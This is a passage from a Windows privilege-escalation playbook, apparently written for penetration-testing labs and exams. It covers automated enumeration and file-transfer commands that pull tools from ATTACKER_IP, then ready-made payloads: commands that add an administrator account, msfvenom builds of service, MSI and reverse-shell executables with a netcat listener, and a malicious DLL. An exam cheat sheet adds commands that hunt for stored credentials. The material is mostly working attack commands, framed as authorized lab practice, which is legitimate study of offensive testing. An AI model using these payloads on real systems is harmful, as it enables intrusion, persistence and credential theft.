- Stability risk
- Known side effects
- Payload compatibility
- Security-product interference

Exploit suggesters produce candidates, not proof.

## 21.3 Common Lab Categories

Historical training environments may include:

```text
Unpatched kernel vulnerabilities
Vulnerable third-party drivers
Installer service vulnerabilities
Print Spooler vulnerabilities
Win32k vulnerabilities
Secondary Logon or task-scheduler flaws
```

Do not assume a historical CVE applies to a modern host.

---

# 22. Automated Enumeration

## 22.1 WinPEAS

```cmd
winPEASx64.exe
```

Redirect output:

```cmd
winPEASx64.exe > C:\Temp\winpeas.txt 2>&1
```

Batch version:

```cmd
cmd.exe /c "winpeas.bat > C:\Temp\winpeas-bat.txt 2>&1"
```

Review from PowerShell:

```powershell
Get-Content C:\Temp\winpeas.txt -Tail 200
```

## 22.2 PowerUp

In an authorized lab:

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

Review each reported condition manually.

## 22.3 Seatbelt

```cmd
Seatbelt.exe -group=system
Seatbelt.exe -group=user
Seatbelt.exe -group=misc
```

## 22.4 AccessChk

Service rights:

```cmd
accesschk64.exe -accepteula -uwcqv USERNAME *
```

Writable directories:

```cmd
accesschk64.exe -accepteula -uwdqs Users C:\
```

Target path:

```cmd
accesschk64.exe -accepteula -wvu "C:\Program Files\Vendor"
```

## 22.5 Autoruns and Procmon

Use Autoruns to identify persistence and startup entries.

Use Procmon to investigate:

- Missing DLLs
- Missing files
- Registry lookups
- Access-denied events
- Search paths
- Process creation

Automated output should be prioritized as:

1. Token privileges
2. Credentials
3. Service permissions
4. Scheduled tasks
5. Autoruns
6. Writable privileged paths
7. Registry policies
8. Software and kernel candidates

---

# 23. File Transfer

Use transfer methods allowed by the lab or engagement.

## 23.1 Python HTTP Server

Attacker:

```bash
python3 -m http.server 8000
```

PowerShell download:

```powershell
Invoke-WebRequest http://ATTACKER_IP:8000/tool.exe -OutFile C:\Temp\tool.exe
```

Short form:

```powershell
iwr http://ATTACKER_IP:8000/tool.exe -OutFile C:\Temp\tool.exe
```

## 23.2 `certutil`

```cmd
certutil -urlcache -split -f http://ATTACKER_IP:8000/tool.exe C:\Temp\tool.exe
```

This may be logged or blocked.

## 23.3 BITS

```cmd
bitsadmin /transfer job /download /priority normal ^
    http://ATTACKER_IP:8000/tool.exe C:\Temp\tool.exe
```

PowerShell alternative:

```powershell
Start-BitsTransfer http://ATTACKER_IP:8000/tool.exe C:\Temp\tool.exe
```

## 23.4 SMB

Attacker:

```bash
impacket-smbserver share . -smb2support
```

Target:

```cmd
copy \\ATTACKER_IP\share\tool.exe C:\Temp\tool.exe
```

Credentials or SMB signing requirements may apply.

## 23.5 RDP Drive Mapping

When mapped during connection:

```cmd
copy \\tsclient\share\tool.exe C:\Temp\tool.exe
```

## 23.6 Verify Integrity

On Linux:

```bash
sha256sum tool.exe
```

On Windows:

```cmd
certutil -hashfile C:\Temp\tool.exe SHA256
```

---

# 24. Reusable Lab Payloads

Payloads are not vulnerabilities. They require a privileged execution path.

## 24.1 Add Current User to Local Administrators

```cmd
cmd.exe /c net localgroup Administrators USERNAME /add
```

Verify:

```cmd
net localgroup Administrators
```

Group membership may not affect the current token immediately. Logon again or create a new process under a new logon session when required.

## 24.2 Create a Local Administrator

```cmd
cmd.exe /c net user labadmin "StrongLabPassword123!" /add
cmd.exe /c net localgroup Administrators labadmin /add
```

Creating accounts is intrusive. Prefer a proof command or file when engagement rules discourage account creation.

## 24.3 Proof File

```cmd
cmd.exe /c whoami > C:\Windows\Temp\privesc-proof.txt
```

This is often a cleaner proof than creating an account.

## 24.4 Service-Style Executable

Generate a lab executable:

```bash
msfvenom -p windows/x64/exec \
    CMD='cmd.exe /c whoami > C:\Windows\Temp\service-proof.txt' \
    -f exe-service -o service.exe
```

Match `windows/exec` or `windows/x64/exec` to the target process architecture.

## 24.5 Reverse Shell

Use only where allowed and where network egress is understood:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f exe -o shell.exe
```

Listener:

```bash
nc -lvnp 4444
```

A local proof action is usually easier to troubleshoot than a reverse shell.

## 24.6 MSI

```bash
msfvenom -p windows/x64/exec \
    CMD='cmd.exe /c whoami > C:\Windows\Temp\msi-proof.txt' \
    -f msi -o setup.msi
```

Install:

```cmd
msiexec /quiet /qn /i C:\Temp\setup.msi
```

## 24.7 Malicious DLL

```c
#include <windows.h>

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved
) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        WinExec(
            "cmd.exe /c whoami > C:\\Windows\\Temp\\dll-proof.txt",
            SW_HIDE
        );
    }
    return TRUE;
}
```

Compile:

```bash
x86_64-w64-mingw32-gcc payload.c -shared -o payload.dll
```

---

# 25. Troubleshooting

## 25.1 Service Configuration Change Fails

Check:

```cmd
accesschk64.exe -accepteula -uwcqv USERNAME SERVICE_NAME
sc qc SERVICE_NAME
```

Possible causes:

- No `SERVICE_CHANGE_CONFIG`
- Incorrect service name
- Protected service
- Incorrect `sc.exe` syntax
- Missing space after `binPath=`
- Command quoting error

## 25.2 Service Does Not Start

```cmd
sc query SERVICE_NAME
sc start SERVICE_NAME
```

Possible causes:

- Executable is not a valid service
- Wrong architecture
- Missing DLL dependency
- Antivirus removed the file
- Path contains incorrectly quoted arguments
- Service account cannot access the file
- Payload exited before reporting service status

Check whether the proof action still executed.

## 25.3 Replaced Service Binary Does Not Execute

Check:

```cmd
dir "C:\Path\service.exe"
icacls "C:\Path\service.exe"
sc qc SERVICE_NAME
```

Possible causes:

- Wrong executable path
- Service already loaded the original
- Service cannot be restarted
- File replacement silently failed
- Binary is blocked
- Architecture mismatch
- Service account lacks access to the replacement

## 25.4 Unquoted Path Does Not Work

Check:

```cmd
sc qc SERVICE_NAME
icacls "C:\Candidate\Directory"
```

Possible causes:

- Path is actually quoted
- Candidate filename is incorrect
- Candidate directory is not writable
- Service start account is not privileged
- Service cannot be restarted
- An earlier candidate already exists
- Windows resolves the path differently than expected

## 25.5 AlwaysInstallElevated Fails

Verify both keys:

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKCU\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
```

Possible causes:

- One key is absent or disabled
- MSI payload is malformed
- Application control blocks installation
- Architecture mismatch
- The expected proof location is incorrect

## 25.6 Potato Technique Fails

Check:

```cmd
whoami /priv
systeminfo
```

Possible causes:

- Required impersonation privilege is absent or disabled
- Technique incompatible with OS build
- Required service or RPC endpoint unavailable
- CLSID invalid for the host
- Named-pipe interaction blocked
- Defender or EDR blocks execution
- Process architecture mismatch

## 25.7 DLL Hijack Fails

Check:

- Exact missing DLL name
- Exact attempted path
- Process architecture
- Directory ACL
- Process token
- Required exports
- Procmon trace after triggering

A `NAME NOT FOUND` event alone is not enough. The path must be writable and the load must occur in a privileged context.

## 25.8 Administrators Group Added but Shell Is Still Low Privileged

Check:

```cmd
whoami /groups
whoami /all
```

The current access token does not automatically gain newly assigned group membership. Start a new logon session. UAC may still produce a medium-integrity token for a local administrator.

## 25.9 Payload Connects Back as the Wrong User

The payload executes in the context of the process that launched it. Verify:

- Service `StartName`
- Scheduled task principal
- Autorun user
- Token impersonation result
- Whether privileges were dropped
- Which trigger actually executed the payload

---

# 26. Exam Quick Reference

## 26.1 First Commands

```cmd
whoami
whoami /all
whoami /priv
whoami /groups
hostname
systeminfo
ipconfig /all
route print
netstat -ano
tasklist /svc
net user
net localgroup Administrators
cmdkey /list
```

## 26.2 Services

```cmd
sc query state= all
wmic service get Name,StartName,State,PathName
sc qc SERVICE_NAME
accesschk64.exe -accepteula -uwcqv USERNAME SERVICE_NAME
icacls "C:\Path\To\Service"
```

## 26.3 Unquoted Paths

```powershell
Get-CimInstance Win32_Service |
    Where-Object {
        $_.PathName -match ' ' -and
        $_.PathName -notmatch '^\s*"'
    } |
    Select-Object Name, StartName, PathName
```

## 26.4 Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
```

## 26.5 Registry

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKCU\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
```

## 26.6 Credentials

```cmd
cmdkey /list
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
dir C:\unattend.xml /s /b
dir C:\*.kdbx /s /b
dir C:\*.config /s /b
```

## 26.7 Installed Software

```powershell
Get-ItemProperty `
    HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*, `
    HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* `
    -ErrorAction SilentlyContinue |
    Select-Object DisplayName, DisplayVersion, InstallLocation
```

## 26.8 Automated Enumeration

```cmd
winPEASx64.exe > C:\Temp\winpeas.txt 2>&1
accesschk64.exe -accepteula -uwcqv USERNAME *
```

## 26.9 Final Questions

```text
Which privileged process executes attacker-controlled content?
Can I modify a service, task, autorun, registry key, binary, or DLL path?
Which token privileges are available?
Are credentials stored locally?
Can I trigger the privileged component?
What is the least disruptive proof of escalation?
```

---

# 27. Finding Documentation Template

```markdown
## Finding: [Technique Name]

### Current Context

```cmd
whoami /all
```

### Enumeration

```cmd
COMMAND
```

### Evidence

```text
RELEVANT OUTPUT
```

### Vulnerable Condition

Explain:

- Which component runs with elevated privileges
- Which permission is weak
- What the current user controls
- How the component is triggered

### Verification

```cmd
SAFE VERIFICATION COMMAND
```

### Exploitation

```cmd
AUTHORIZED LAB COMMAND
```

### Result

```cmd
whoami
whoami /groups
```

### Modified Artifacts

```text
File:
Registry key:
Service:
Task:
Account:
```

### Cleanup

Document restoration commands and confirm the original state.
```

---

# 28. Useful Resources

- LOLBAS: <https://lolbas-project.github.io/>
- GTFOBins for Windows concepts and related references: <https://gtfobins.github.io/>
- HackTricks Windows Local Privilege Escalation: <https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html>
- PayloadsAllTheThings Windows Privilege Escalation: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation>
- PEASS-ng / WinPEAS: <https://github.com/peass-ng/PEASS-ng>
- PowerUp: <https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc>
- Seatbelt: <https://github.com/GhostPack/Seatbelt>
- Sysinternals AccessChk: <https://learn.microsoft.com/sysinternals/downloads/accesschk>
- Sysinternals Autoruns: <https://learn.microsoft.com/sysinternals/downloads/autoruns>
- Sysinternals Process Monitor: <https://learn.microsoft.com/sysinternals/downloads/procmon>
- Priv2Admin: <https://github.com/gtworek/Priv2Admin>
- Windows Exploit Suggester - Next Generation: <https://github.com/bitsadmin/wesng>

---

## Room-Specific Notes

Keep room credentials, fixed service names, expected passwords, and exact vulnerable paths in a separate walkthrough file rather than in this reusable playbook.

Suggested format:

```markdown
# Lab Name

## Access

- Target:
- Username:
- Password:
- Connection method:

## Finding 1

- Technique:
- Vulnerable object:
- Evidence:
- Trigger:
- Result:
- Cleanup:

## Flags and Answers

- Task:
- Answer:
```

This separation prevents lab-specific values from being mistaken for universal commands during an exam.
